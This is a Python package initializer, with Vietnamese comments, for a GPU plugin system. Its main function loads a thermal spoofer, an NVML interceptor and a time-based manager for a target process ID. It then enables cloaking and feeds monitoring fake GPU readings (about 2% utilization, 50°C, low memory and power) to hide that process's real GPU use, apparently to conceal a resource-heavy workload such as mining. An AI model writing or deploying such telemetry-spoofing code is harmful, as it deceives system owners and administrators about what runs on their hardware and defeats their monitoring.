# -*- coding: utf-8 -*-
"""GPU Plugins Package - Quan ly tat ca GPU-related components

Tach biet hoan toan GPU logic khoi CPU plugins de:
- Tang tinh mo-dun va de maintain
- Cung cap interface chuan cho GPU operations
- Ho tro multiple GPU cloaking strategies
- Centralized GPU telemetry filtering
"""

from .core.interfaces import (
    IGPUPlugin,
    IGPUCloakService, 
    IGPUTelemetryFilter,
    IGPUHookManager
)

from .core.registry import gpu_plugin_registry
from .core.manager import GPUPluginManager

# Version info
__version__ = "1.0.0"
__author__ = "GPU Plugins Team"

# Export main APIs
__all__ = [
    "IGPUPlugin",
    "IGPUCloakService",
    "IGPUTelemetryFilter", 
    "IGPUHookManager",
    "gpu_plugin_registry",
    "GPUPluginManager",
    "apply_gpu_strategies"
]

def create_gpu_manager(config_path=None):
    """Convenience function de tao GPU Plugin Manager
    
    Args:
        config_path: Duong dan toi config file (optional)
        
    Returns:
        GPUPluginManager instance
    """
    return GPUPluginManager(config_path)

def get_plugin_registry():
    """Lay global GPU plugin registry
    
    Returns:
        GPUPluginRegistry instance
    """
    return gpu_plugin_registry

def apply_gpu_strategies(pid, strategies=None):
    """
    Áp dụng các GPU strategies cho một tiến trình theo blueprint specification.
    
    Args:
        pid (int): Process ID cần áp dụng strategies
        strategies (list, optional): List các strategies để áp dụng. 
                                   None = áp dụng tất cả available strategies
    
    Returns:
        bool: True nếu thành công, False nếu thất bại
    """
    import logging
    logger = logging.getLogger(__name__)
    
    try:
        logger.info(f"🎯 [GPU Plugin Delegation] Applying GPU strategies for PID={pid}")
        
        # Tạo GPU Plugin Manager instance
        gpu_manager = create_gpu_manager()
        
        # Load và enable các plugins cần thiết
        available_plugins = [
            'thermal_spoofer',
            'nvml_interceptor', 
            'time_based_manager'
        ]
        
        # Load plugins
        loaded_plugins = []
        for plugin_name in available_plugins:
            try:
                if gpu_manager.load_plugin(plugin_name):
                    loaded_plugins.append(plugin_name)
                    logger.info(f"✅ Loaded GPU plugin: {plugin_name}")
                else:
                    logger.warning(f"⚠️ Failed to load GPU plugin: {plugin_name}")
            except Exception as e:
                logger.error(f"❌ Error loading GPU plugin {plugin_name}: {e}")
        
        if not loaded_plugins:
            logger.error("❌ No GPU plugins loaded successfully")
            return False
        
        # Start loaded plugins
        start_results = gpu_manager.start_all_plugins()
        successful_starts = [name for name, success in start_results.items() if success]
        
        if not successful_starts:
            logger.error("❌ No GPU plugins started successfully")
            return False
        
        logger.info(f"✅ Started GPU plugins: {successful_starts}")
        
        # Enable cloaking cho tất cả services
        cloaking_results = gpu_manager.enable_all_cloaking()
        successful_cloaking = [name for name, success in cloaking_results.items() if success]
        
        if successful_cloaking:
            logger.info(f"✅ Enabled GPU cloaking services: {successful_cloaking}")
        else:
            logger.warning("⚠️ No GPU cloaking services enabled")
        
        # Update fake metrics để enhance cloaking
        fake_metrics = {
            'utilization': 2,        # Fake low utilization
            'temperature': 50,       # Fake temperature
            'memory_used': 100,      # Fake memory usage
            'power_usage': 150       # Fake power usage
        }
        
        gpu_manager.update_all_fake_metrics(fake_metrics)
        logger.info(f"✅ Updated fake metrics for PID={pid}: {fake_metrics}")
        
        # Log system status
        status = gpu_manager.get_status()
        logger.info(f"📊 GPU Plugin System Status: {len(status['loaded_plugins'])} plugins loaded, running: {status['running']}")
        
        return True
        
    except Exception as e:
        logger.error(f"❌ Error in apply_gpu_strategies for PID={pid}: {e}")
        import traceback
        logger.debug(traceback.format_exc())
        return False